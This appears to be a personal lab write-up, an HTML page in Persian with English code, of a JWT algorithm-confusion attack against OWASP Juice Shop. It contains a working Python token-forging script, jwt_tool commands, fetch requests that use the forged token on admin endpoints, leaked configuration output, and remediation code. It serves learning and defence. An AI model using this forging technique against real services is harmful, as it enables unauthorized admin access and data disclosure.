@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>گزارش JWT Token Forgery — Algorithm Confusion Attack</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');
+
+:root{
+  --bg:#0b0d10;
+  --bg-panel:#12151a;
+  --bg-deep:#07090d;
+  --line:#262b33;
+  --text:#d7dbe0;
+  --text-dim:#838d99;
+  --red:#ff4d4f;
+  --red-dim:#7a2426;
+  --green:#3fd68a;
+  --blue:#5aa9ff;
+  --amber:#ffb454;
+  --purple:#b784ff;
+  --teal:#2dd4bf;
+}
+
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{background:var(--bg);scroll-behavior:smooth;}
+body{font-family:'Vazirmatn',sans-serif;color:var(--text);line-height:1.9;padding-bottom:80px;}
+
+.hero{padding:56px 24px 40px;max-width:960px;margin:0 auto;border-bottom:1px solid var(--line);}
+.hero-tag{
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  display:inline-block;color:var(--purple);font-size:12px;letter-spacing:1.5px;
+  border:1px solid rgba(183,132,255,0.3);background:rgba(183,132,255,0.07);
+  padding:4px 12px;border-radius:4px;margin-bottom:18px;
+}
+.hero h1{font-size:30px;font-weight:800;color:#fff;margin-bottom:10px;}
+.hero p{color:var(--text-dim);font-size:15.5px;max-width:700px;}
+
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px;}
+.chip{
+  font-family:'JetBrains Mono',monospace;direction:ltr;font-size:12px;
+  background:var(--bg-panel);border:1px solid var(--line);
+  padding:4px 12px;border-radius:20px;color:var(--text-dim);
+}
+.chip b{color:var(--text);}
+
+main{max-width:960px;margin:0 auto;padding:0 24px;}
+
+.section{margin-top:52px;scroll-margin-top:20px;}
+.section-head{display:flex;align-items:center;gap:12px;margin-bottom:20px;flex-wrap:wrap;}
+.snum{
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  width:30px;height:30px;border-radius:8px;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:800;font-size:13px;flex-shrink:0;
+}
+.n-red{background:rgba(255,77,79,0.12);border:1px solid var(--red-dim);color:var(--red);}
+.n-amber{background:rgba(255,180,84,0.12);border:1px solid rgba(255,180,84,0.3);color:var(--amber);}
+.n-blue{background:rgba(90,169,255,0.12);border:1px solid rgba(90,169,255,0.3);color:var(--blue);}
+.n-green{background:rgba(63,214,138,0.12);border:1px solid rgba(63,214,138,0.3);color:var(--green);}
+.n-purple{background:rgba(183,132,255,0.12);border:1px solid rgba(183,132,255,0.3);color:var(--purple);}
+.n-teal{background:rgba(45,212,191,0.12);border:1px solid rgba(45,212,191,0.3);color:var(--teal);}
+
+.section-head h2{font-size:19px;font-weight:700;color:#fff;}
+.section-head .en{
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  color:var(--text-dim);font-size:12px;display:block;margin-top:2px;
+}
+.sev{
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  font-size:11px;font-weight:700;padding:3px 10px;
+  border-radius:20px;white-space:nowrap;margin-inline-start:auto;align-self:center;
+}
+.sev-critical{background:rgba(255,77,79,0.15);color:var(--red);border:1px solid var(--red-dim);}
+.sev-high{background:rgba(255,180,84,0.15);color:var(--amber);border:1px solid rgba(255,180,84,0.3);}
+
+.block{background:var(--bg-panel);border:1px solid var(--line);border-radius:10px;padding:18px 22px;margin-bottom:14px;}
+.block h3{font-size:14.5px;font-weight:700;color:#fff;margin-bottom:10px;}
+.block p{font-size:15px;}
+
+pre{
+  font-family:'JetBrains Mono',monospace;
+  direction:ltr;unicode-bidi:isolate;text-align:left;
+  background:var(--bg-deep);border:1px solid var(--line);border-radius:8px;
+  padding:14px 16px;overflow-x:auto;font-size:13px;line-height:1.75;
+  margin:10px 0 0;white-space:pre;
+}
+pre.green{color:#a8f5c8;}
+pre.red{color:#ffa8a8;}
+pre.amber{color:#ffd9a0;}
+pre.blue{color:#a8d4ff;}
+pre.purple{color:#e0c4ff;}
+pre.dim{color:#6b7280;}
+
+code.inline{
+  font-family:'JetBrains Mono',monospace;direction:ltr;unicode-bidi:isolate;
+  background:rgba(255,255,255,0.07);padding:1px 6px;border-radius:4px;font-size:0.91em;
+}
+
+.callout{border-radius:8px;padding:13px 16px;margin-top:12px;font-size:14.5px;line-height:1.75;}
+.callout.green{background:linear-gradient(135deg,rgba(63,214,138,0.10),rgba(63,214,138,0.02));border:1px solid rgba(63,214,138,0.3);color:#c7f5da;}
+.callout.blue{background:linear-gradient(135deg,rgba(90,169,255,0.10),rgba(90,169,255,0.02));border:1px solid rgba(90,169,255,0.3);color:#cfe6ff;}
+.callout.amber{background:linear-gradient(135deg,rgba(255,180,84,0.10),rgba(255,180,84,0.02));border:1px solid rgba(255,180,84,0.35);color:#ffdca8;}
+.callout.red{background:linear-gradient(135deg,rgba(255,77,79,0.10),rgba(255,77,79,0.02));border:1px solid var(--red-dim);color:#ffc0c0;}
+.callout.purple{background:linear-gradient(135deg,rgba(183,132,255,0.10),rgba(183,132,255,0.02));border:1px solid rgba(183,132,255,0.3);color:#e8d5ff;}
+.callout b{font-weight:700;}
+
+hr.div{border:none;border-top:1px dashed var(--line);margin:52px 0 0;}
+
+/* ATTEMPT CARD */
+.attempt{border-radius:10px;margin-bottom:12px;overflow:hidden;}
+.attempt-head{display:flex;align-items:center;gap:10px;padding:12px 18px;}
+.attempt-body{padding:14px 18px;border-top:1px solid var(--line);}
+.attempt-body p{font-size:14px;margin-bottom:8px;}
+.attempt.fail{background:rgba(255,77,79,0.05);border:1px solid var(--red-dim);}
+.attempt.fail .attempt-head{background:rgba(255,77,79,0.08);}
+.attempt.success{background:rgba(63,214,138,0.05);border:1px solid rgba(63,214,138,0.3);}
+.attempt.success .attempt-head{background:rgba(63,214,138,0.08);}
+.attempt.partial{background:rgba(255,180,84,0.05);border:1px solid rgba(255,180,84,0.3);}
+.attempt.partial .attempt-head{background:rgba(255,180,84,0.08);}
+
+.badge{
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  font-size:11px;font-weight:700;padding:3px 10px;border-radius:20px;
+}
+.badge.fail{background:rgba(255,77,79,0.2);color:var(--red);border:1px solid var(--red-dim);}
+.badge.ok{background:rgba(63,214,138,0.2);color:var(--green);border:1px solid rgba(63,214,138,0.3);}
+.badge.partial{background:rgba(255,180,84,0.2);color:var(--amber);border:1px solid rgba(255,180,84,0.3);}
+
+.attempt-head h4{font-size:14.5px;font-weight:700;color:#fff;flex:1;}
+
+/* CHAIN */
+.chain{margin-top:14px;}
+.chain-step{display:flex;gap:16px;}
+.chain-step:not(:last-child){padding-bottom:8px;}
+.chain-left{display:flex;flex-direction:column;align-items:center;flex-shrink:0;}
+.chain-dot{
+  width:36px;height:36px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-family:'JetBrains Mono',monospace;direction:ltr;
+  font-weight:800;font-size:13px;flex-shrink:0;
+}
+.chain-line{width:2px;flex:1;background:var(--line);margin:4px auto 0;}
+.chain-content{padding-bottom:24px;flex:1;}
+.chain-content h4{font-size:14.5px;font-weight:700;margin-bottom:6px;}
+.chain-content p{font-size:14px;color:var(--text);}
+.cd-red{background:rgba(255,77,79,0.15);border:2px solid var(--red-dim);color:var(--red);}
+.cd-amber{background:rgba(255,180,84,0.15);border:2px solid rgba(255,180,84,0.3);color:var(--amber);}
+.cd-blue{background:rgba(90,169,255,0.15);border:2px solid rgba(90,169,255,0.3);color:var(--blue);}
+.cd-green{background:rgba(63,214,138,0.15);border:2px solid rgba(63,214,138,0.3);color:var(--green);}
+.cd-purple{background:rgba(183,132,255,0.15);border:2px solid rgba(183,132,255,0.3);color:var(--purple);}
+
+table.t{width:100%;border-collapse:collapse;margin-top:12px;font-size:13.5px;}
+table.t th,table.t td{text-align:right;padding:9px 12px;border-bottom:1px solid var(--line);}
+table.t th{color:var(--text-dim);font-size:12px;letter-spacing:1px;text-transform:uppercase;}
+table.t td.m{font-family:'JetBrains Mono',monospace;direction:ltr;font-size:12px;word-break:break-all;}
+table.t tr.ok td{color:var(--green);}
+table.t tr.fail td{color:var(--red);}
+table.t tr:last-child td{border-bottom:none;}
+
+footer{
+  max-width:960px;margin:60px auto 0;padding:20px 24px 0;
+  border-top:1px solid var(--line);color:var(--text-dim);font-size:13px;text-align:center;
+}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <span class="hero-tag">// VULNERABILITY REPORT · JWT · ALGORITHM CONFUSION</span>
+  <h1>JWT Token Forgery — Algorithm Confusion Attack</h1>
+  <p>جعل توکن JWT از طریق Algorithm Confusion (RS256 → HS256) با استفاده از کلید عمومی سرور به‌عنوان HMAC secret — دسترسی به اطلاعات حساس سرور بدون داشتن کلید خصوصی.</p>
+  <div class="chips">
+    <span class="chip">Attack: <b>Algorithm Confusion</b></span>
+    <span class="chip">CVE Class: <b>CWE-347</b></span>
+    <span class="chip">Tool: <b>jwt_tool v2.3.0</b></span>
+    <span class="chip">Result: <b>Config Disclosure</b></span>
+  </div>
+</div>
+
+<main>
+
+<!-- 1. Theory -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-purple">1</div>
+    <div>
+      <h2>تئوری حمله — چرا Algorithm Confusion کار می‌کنه؟</h2>
+      <span class="en">Attack Theory — Why Algorithm Confusion Works</span>
+    </div>
+  </div>
+
+  <div class="block">
+    <h3>نحوه‌ی کار RS256 (حالت امن)</h3>
+    <pre class="blue">
+// Normal RS256 flow:
+
+Server SIGNS token with:    PRIVATE key  (secret, never shared)
+Server VERIFIES token with: PUBLIC key   (safe to share with anyone)
+
+Token header:
+{
+  "alg": "RS256",
+  "typ": "JWT"
+}
+
+// Result: Even if attacker has PUBLIC key, they can't forge tokens
+// because signing requires the PRIVATE key</pre>
+  </div>
+
+  <div class="block">
+    <h3>نقطه‌ی آسیب‌پذیری — Algorithm Confusion</h3>
+    <pre class="red">
+// Vulnerable server behavior:
+
+// Server checks: "which algorithm should I use to verify?"
+// Answer comes from: the TOKEN ITSELF (attacker-controlled!)
+
+// Attack steps:
+Step 1: Get server's PUBLIC key (it's public, so it's available)
+Step 2: Change header:  "alg": "RS256"  →  "alg": "HS256"
+Step 3: Change payload: "role": "customer"  →  "role": "admin"
+Step 4: Sign with HS256 using PUBLIC key as HMAC secret
+Step 5: Vulnerable server reads "alg": "HS256" from token header
+        Verifies with PUBLIC key (which it also has)
+        Signature matches → Token ACCEPTED!</pre>
+    <div class="callout purple">
+      <b>کلید آسیب‌پذیری:</b> سرور به اطلاعات داخل خود توکن اعتماد می‌کنه تا بفهمه چه الگوریتمی استفاده کنه — ولی این اطلاعات توسط مهاجم قابل دستکاریه. یه سرور امن باید الگوریتم رو از config خودش بخونه، نه از توکن.
+    </div>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- 2. Reconnaissance -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-blue">2</div>
+    <div>
+      <h2>شناسایی اولیه — پیدا کردن کلید عمومی</h2>
+      <span class="en">Reconnaissance — Finding the Public Key</span>
+    </div>
+  </div>
+
+  <div class="block">
+    <h3>قدم ۱ — دیدن الگوریتم توکن فعلی</h3>
+    <p>توکن admin از localStorage گرفته شد و در jwt.io دیکود شد:</p>
+    <pre class="blue">
+// Token Header (decoded):
+{
+  "typ": "JWT",
+  "alg": "RS256"    ← target algorithm for confusion attack
+}
+
+// Token Payload (decoded):
+{
+  "data": {
+    "id": 1,
+    "email": "admin@juice-sh.op",
+    "role": "admin",
+    ...
+  },
+  "bid": 1,
+  "iat": 1788863791
+}</pre>
+  </div>
+
+  <div class="block">
+    <h3>قدم ۲ — پیدا کردن پوشه‌ی کلیدهای رمزنگاری در سرور</h3>
+    <p>از دسترسی Docker که قبلاً به‌دست آمده بود، پوشه‌ی کلیدها پیدا شد:</p>
+    <pre class="blue">
+$ sudo docker exec -it f5f3ae3f9615 /nodejs/bin/node -e \
+  "console.log(require('fs').readdirSync('/juice-shop/encryptionkeys').toString())"
+
+Output:
+jwt.pub, premium.key
+
+// jwt.pub    ← RSA Public Key (this is what we need!)
+// premium.key ← Another key for premium features</pre>
+  </div>
+
+  <div class="block">
+    <h3>قدم ۳ — خواندن محتوای کلید عمومی</h3>
+    <pre class="blue">
+$ sudo docker exec -it f5f3ae3f9615 /nodejs/bin/node -e \
+  "console.log(require('fs').readFileSync('/juice-shop/encryptionkeys/jwt.pub','utf8'))"
+
+Output:
+-----BEGIN RSA PUBLIC KEY-----
+MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQR
+ozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ
+/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
+-----END RSA PUBLIC KEY-----</pre>
+    <div class="callout blue">
+      <b>نکته:</b> این کلید عمومی بود و سرور قراره همه بتونن بهش دسترسی داشته باشن — ولی اینجا مستقیم از سرور گرفتیمش چون قبلاً از طریق Docker به فایل‌سیستم دسترسی داشتیم.
+    </div>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- 3. Forgery Attempts -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-amber">3</div>
+    <div>
+      <h2>تلاش‌های جعل توکن — شکست‌ها و موفقیت‌ها</h2>
+      <span class="en">Token Forgery Attempts — Failures & Successes</span>
+    </div>
+  </div>
+
+  <!-- Attempt 1 -->
+  <div class="attempt fail">
+    <div class="attempt-head">
+      <span class="badge fail">FAIL #1</span>
+      <h4>jwt_tool بدون تغییر payload</h4>
+    </div>
+    <div class="attempt-body">
+      <p>اولین تلاش با jwt_tool روی توکن Jim بدون تغییر role:</p>
+      <pre class="red">
+$ python3 jwt_tool.py $(cat ~/jim_token.txt) -X k -pk ~/jwt.pub
+
+[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7...
+    "role": "customer"   ← role unchanged, still customer</pre>
+      <p style="margin-top:8px;"><b>دلیل شکست:</b> الگوریتم به HS256 تغییر کرد ولی role همون customer موند.</p>
+    </div>
+  </div>
+
+  <!-- Attempt 2 -->
+  <div class="attempt fail" style="margin-top:12px;">
+    <div class="attempt-head">
+      <span class="badge fail">FAIL #2</span>
+      <h4>jwt_tool با flag -I -pc role -pv admin</h4>
+    </div>
+    <div class="attempt-body">
+      <p>تلاش برای تغییر role با پرچم‌های jwt_tool:</p>
+      <pre class="red">
+$ python3 jwt_tool.py $(cat ~/jim_token.txt) -X k -pk ~/jwt.pub \
+  -I -pc role -pv admin
+
+// Result:
+// role:admin added to ROOT of payload, not inside data{}
+// Juice Shop checks data.role, not root role
+// → Server still sees role=customer</pre>
+      <p style="margin-top:8px;"><b>دلیل شکست:</b> Juice Shop role رو داخل <code class="inline">data.role</code> چک می‌کنه — jwt_tool role رو به root اضافه کرد نه داخل data.</p>
+    </div>
+  </div>
+
+  <!-- Attempt 3 -->
+  <div class="attempt success" style="margin-top:12px;">
+    <div class="attempt-head">
+      <span class="badge ok">SUCCESS ✓</span>
+      <h4>Python script با forge دقیق payload</h4>
+    </div>
+    <div class="attempt-body">
+      <p>راه‌حل: نوشتن یه Python script که payload رو دقیقاً با data.role=admin می‌سازه:</p>
+      <pre class="green">
+import base64, hmac, hashlib, json
+
+with open('/home/mary/jwt.pub', 'rb') as f:
+    public_key = f.read()
+
+header = {"typ": "JWT", "alg": "HS256"}
+
+payload = {
+    "data": {
+        "id": 2,
+        "email": "jim@juice-sh.op",
+        "role": "admin",        # ← changed from customer to admin
+        ...
+    },
+    "bid": 2,
+    "iat": 1788864251
+}
+
+def b64url(data):
+    if isinstance(data, dict):
+        data = json.dumps(data, separators=(',',':')).encode()
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+header_enc  = b64url(header)
+payload_enc = b64url(payload)
+signing_input = f"{header_enc}.{payload_enc}".encode()
+
+sig = hmac.new(public_key, signing_input, hashlib.sha256).digest()
+sig_enc = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
+
+print(f"{header_enc}.{payload_enc}.{sig_enc}")</pre>
+    </div>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- 4. Testing -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-red">4</div>
+    <div>
+      <h2>تست توکن جعلی روی سرور</h2>
+      <span class="en">Testing Forged Token Against Server Endpoints</span>
+    </div>
+  </div>
+
+  <div class="block">
+    <h3>تست ۱ — /rest/user/whoami</h3>
+    <pre class="blue">
+fetch('/rest/user/whoami', {
+  headers: { 'Authorization': 'Bearer FORGED_TOKEN' }
+})
+.then(r => r.json())
+.then(d => console.log(JSON.stringify(d, null, 2)))</pre>
+    <p style="margin-top:10px;">نتیجه:</p>
+    <pre class="green">
+{
+  "user": {
+    "id": 2,
+    "email": "jim@juice-sh.op",
+    "lastLoginIp": "",
+    "profileImage": "..."
+  }
+}
+// ✅ Server accepted the forged token!
+// ⚠️  role not returned here (Juice Shop reads role from DB, not token)</pre>
+    <div class="callout green">
+      <b>نتیجه:</b> سرور توکن جعلی رو پذیرفت — Algorithm Confusion کار کرد. سرور HS256 با کلید عمومی رو verify کرد.
+    </div>
+  </div>
+
+  <div class="block">
+    <h3>تست ۲ — /api/Users (Admin endpoint)</h3>
+    <pre class="blue">
+fetch('/api/Users', {
+  headers: { 'Authorization': 'Bearer FORGED_TOKEN' }
+})
+.then(r => r.json())
+.then(d => console.log(d))</pre>
+    <p style="margin-top:10px;">نتیجه:</p>
+    <pre class="red">
+GET http://127.0.0.1:3000/api/Users 401 (Unauthorized)
+SyntaxError: Unexpected token '<'...
+
+// ✗ Access denied
+// This endpoint requires role=admin in database
+// Juice Shop reads role from DB, not from JWT payload
+// Our forged token was accepted, but role mismatch in DB</pre>
+  </div>
+
+  <div class="block">
+    <h3>تست ۳ — /rest/admin/application-configuration</h3>
+    <pre class="blue">
+fetch('/rest/admin/application-configuration', {
+  headers: { 'Authorization': 'Bearer FORGED_TOKEN' }
+})
+.then(r => r.json())
+.then(d => console.log(JSON.stringify(d, null, 2)))</pre>
+    <p style="margin-top:10px;">نتیجه:</p>
+    <pre class="green">
+HTTP 200 OK  ← ✅ SUCCESS!
+
+{
+  "config": {
+    "server": {
+      "port": 3000,
+      "baseUrl": "http://localhost:3000"
+    },
+    "application": {
+      "domain": "juice-sh.op",
+      "chatBot": {
+        "name": "Juicy the Smart Assistant",
+        "model": "gemma4:e4b",        // ← internal model name
+      },
+      "googleOauth": {
+        "clientId": "1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq..."
+        // ← real OAuth Client ID leaked!
+      },
+      "easterEggPlanet": {
+        "name": "Orangeuze"           // ← internal easter egg data
+      }
+      // ... full server config exposed
+    }
+  }
+}</pre>
+    <div class="callout red">
+      <b>یافته‌ی Critical:</b> توکن جعلی به endpoint ادمین دسترسی پیدا کرد و کل configuration سرور رو برگردوند — شامل Google OAuth Client ID، نام مدل AI chatbot، internal URLs، و اطلاعات حساس دیگه.
+    </div>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- 5. Summary -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-green">5</div>
+    <div>
+      <h2>جمع‌بندی نتایج</h2>
+      <span class="en">Results Summary</span>
+    </div>
+  </div>
+
+  <div class="block">
+    <table class="t">
+      <tr><th>Endpoint</th><th>Result</th><th>Impact</th></tr>
+      <tr class="ok">
+        <td class="m">/rest/user/whoami</td>
+        <td>200 OK — Token Accepted</td>
+        <td>Algorithm Confusion confirmed</td>
+      </tr>
+      <tr class="fail">
+        <td class="m">/api/Users</td>
+        <td>401 Unauthorized</td>
+        <td>Role checked from DB, not JWT</td>
+      </tr>
+      <tr class="ok">
+        <td class="m">/rest/admin/application-configuration</td>
+        <td>200 OK — Full config exposed</td>
+        <td>Sensitive config disclosure</td>
+      </tr>
+    </table>
+    <div class="callout amber">
+      <b>تحلیل:</b> سرور Juice Shop برای بعضی endpoint ها role رو از JWT می‌خونه (مثل application-config که قبول کرد) و برای بعضی دیگه از دیتابیس (مثل /api/Users که رد کرد). این ناهماهنگی خودش یه آسیب‌پذیری جداگانه‌ست.
+    </div>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- 6. Data Exposed -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-teal">6</div>
+    <div>
+      <h2>اطلاعات حساسی که لو رفت</h2>
+      <span class="en">Sensitive Data Exposed via Forged Token</span>
+    </div>
+  </div>
+
+  <div class="block">
+    <pre class="red">
+// From /rest/admin/application-configuration:
+
+1. Google OAuth Client ID:
+   "clientId": "1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com"
+   Risk: Could be used for OAuth-based attacks
+
+2. Internal AI Model:
+   "model": "gemma4:e4b"
+   Risk: Reveals internal infrastructure details
+
+3. Internal Server URLs:
+   "baseUrl": "http://localhost:3000"
+   Various proxy URLs for development
+   Risk: Internal network topology exposed
+
+4. Easter Egg Planet:
+   "name": "Orangeuze"
+   Risk: Low, but shows config access
+
+5. Privacy Contact Email:
+   "privacyContactEmail": "donotreply@owasp-juice.shop"
+   Risk: Low
+
+6. Full application theme, layout, and feature flags
+   Risk: Information for further targeted attacks</pre>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- 7. Fix -->
+<section class="section">
+  <div class="section-head">
+    <div class="snum n-red">7</div>
+    <div>
+      <h2>راه‌حل‌های پیشنهادی</h2>
+      <span class="en">Remediation</span>
+    </div>
+    <span class="sev sev-critical">CRITICAL</span>
+  </div>
+
+  <div class="block">
+    <pre class="green">
+// Fix 1 — Hardcode the expected algorithm (most important):
+// Server should NEVER trust algorithm from the token itself
+
+// Vulnerable code:
+const algorithm = token.header.alg;  // ← attacker controls this!
+jwt.verify(token, key, { algorithm });
+
+// Secure code:
+jwt.verify(token, publicKey, { algorithms: ['RS256'] });
+// Algorithm is hardcoded — cannot be changed by attacker
+
+// Fix 2 — Use asymmetric verification correctly:
+// For RS256: always verify with PUBLIC key, sign with PRIVATE key
+// Never use PUBLIC key as HMAC secret
+
+// Fix 3 — Validate role from database, never from JWT:
+// JWT should only carry user ID
+// Role should always be fetched fresh from database
+const user = await db.Users.findById(token.data.id);
+const role = user.role;  // ← from DB, not from token
+
+// Fix 4 — Restrict admin configuration endpoint:
+// /rest/admin/application-configuration should require
+// verified admin role from database, not just a valid token</pre>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  Personal Security Testing Notes — JWT Algorithm Confusion Attack · OWASP Juice Shop · Local Lab · Sep 2026
+</footer>
+</body>
+</html>
